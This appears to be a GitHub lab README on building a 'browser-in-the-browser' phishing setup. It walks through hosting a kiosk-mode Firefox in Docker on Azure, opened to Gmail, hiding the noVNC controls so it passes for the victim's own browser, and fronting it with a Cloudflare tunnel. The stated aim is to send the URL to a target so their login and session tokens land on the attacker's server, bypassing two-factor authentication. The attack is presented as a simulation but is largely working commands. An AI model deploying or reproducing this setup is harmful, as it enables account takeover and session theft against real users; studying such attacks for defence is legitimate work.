<h1>Browser-in-the-browser-Lab</h1>

<h2>Description</h2>
In this browser attack simulation project, we set up a cloud-hosted server and install a web browser such as Chrome or Firefox on it. The browser is then used to load the login or authentication page of a target service (for example, Facebook, Gmail, or Instagram). Next, we configure remote access so that this browser session can be accessed through a unique URL, which is then shared with the intended target. Because the victim interacts with a legitimate website rendered on the cloud-hosted browser rather than their own device, authentication tokens and session data are handled directly within that environment, making it possible to bypass protections such as two-factor or multi-factor authentication in a simulated attack scenario.
<br />


<h2>Languages and Utilities Used</h2>

- <b>Linux Command Line Interface</b> 
- <b>Docker</b>

<h2>Environments Used </h2>

- <b>Azure Cloud</b>

<h2>Install the web browser on the cloud server</h2>

<h3> Install docker on the VM</h3>

<p>First create a Resource Group in Azure then create a virtual machine with the latest Ubuntu Server as the OS image</p>

<p align="center">

<img width="857" height="93" alt="Screenshot_1" src="https://github.com/user-attachments/assets/e66c8698-28e6-419b-9f24-6256226fc856" />
<br />
<br />
<img width="871" height="446" alt="Screenshot_2" src="https://github.com/user-attachments/assets/705d97d1-a133-48b2-8ba6-01a76a3b3162" />
<br />
<br />
<p>Then go to the <b>VM-DOCKER</b> and connect to it</p>
<br />
<br />
<img width="871" height="221" alt="image" src="https://github.com/user-attachments/assets/33f7955e-9933-43e4-b1b2-f018075b0dbb" />
<br />
<br />
<img width="869" height="483" alt="image" src="https://github.com/user-attachments/assets/0802d5f6-44a3-4ea8-b703-3c6e30c88c79" />
<br />
<br />
<p>Then use Windows CMD to connect via ssh with the preconfigured password. Then we have to install Docker in our VM via the CLI.</p>

```bash
# 1. Download the script
curl -fsSL https://get.docker.com -o install-docker.sh

# 2. Verify the script
cat install-docker.sh

# 3. Dry run
sh install-docker.sh --dry-run

# 4. Install
sudo sh install-docker.sh
```
<h3> Install web browser</h3>

<p>Access this [ Github Repo](https://github.com/jlesage/docker-firefox) for the full Firefox installation on Docker. This Docker container comes with Firefox and all the software needed to make Firefox available through a normal URL which can be later shared with the target.</p>
<p>Then use this command through the CLI</p>

```bash
sudo docker run -d --name=firefox-setup -p 80:5800 -v ~/firefox_data:/config:rw --shm-size 2g jlesage/firefox
```
<p>Then in the Network Security Group in our Resource Group, we have to include an Inbound rule that allow Internet users to access our Firefox webpage</p>
<img width="872" height="209" alt="image" src="https://github.com/user-attachments/assets/bc8ef3f7-c019-495d-a1ff-bd765df64198" />
<br>
<img width="865" height="795" alt="image" src="https://github.com/user-attachments/assets/926e6606-2337-4827-b792-a5cdd2d63d42" />
<br>
<p>Access the VM's public IP, we can see another browser within our browser!</p>
<img width="866" height="469" alt="image" src="https://github.com/user-attachments/assets/59cc86d8-c159-4217-b505-13b336c7607c" />
<br>
<p>Then we need to stop and remove the instance **firefox-setup**. Because we don't really need this instance anymore, all the settings that we made have been stored in the directory **firefox-data** . Then when we run the new instance in the next stage, we're going to run it with the configs store in that directory.</p>

```bash
docker stop firefox-setup
docker rm firefox-setup
```
---
<h2>Run Firefox in Kiosk mode</h2>
<br>
<p> Firefox Kiosk Mode is a restrictive, full-screen browser state that locks the interface to a single website, hiding navigation bars, toolbars, and menus to prevent user tampering.</p>
<p> This makes our Firefox on the cloud instance basically merge with the real one, creating the illusion that the user is interacting with their own user</p>

```bash
docker run -d --name=firefox-kiosk -p 80:5800 -e FF_OPEN_URL="https://gmail.com" -e FF_KIOSK=1 -v ~/firefox_data:/config:rw --shm-size 2g  jlesage/firefox
```
<img width="869" height="354" alt="image" src="https://github.com/user-attachments/assets/c415f274-2600-4a06-855f-aa84ff6c2f5d" />
<br>
<p>This looks much more like a normal website now. But there is that button with three dots on the left side. In order to get rid of that button, we enter:</p>

```bash
docker exec firefox-kiosk sed -i 's/<\/head>/<style>#n oVNC_control_bar, #noVNC_control_bar_handle,.noVNC_panel { display: none !important; }<\/style><\/head>/' /opt/noVNC/index.html
```
<br>
<p>Then if the target <b>accidentally</b> logs in with their Gmail acount through our cloud browser instance, we could essentially access to anything on that instance</p>

---
<h2>Optional: Upgrade the website to HTTPS using Cloudflare</h2>
<br>
- STEP 1 — Make sure Firefox is LOCAL only

```bash
docker run -d \
  --name=firefox-kiosk \
  -p 127.0.0.1:5800:5800 \
  -e FF_OPEN_URL="https://gmail.com" \
  -e FF_KIOSK=1 \
  -v ~/firefox_data:/config:rw \
  --shm-size 2g \
  jlesage/firefox
```

-  STEP 2 — Install Cloudflare Tunnel client
  
  ```bash
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
```

- STEP 3 — Start a FREE tunnel
```bash
cloudflared tunnel --url http://127.0.0.1:5800
```
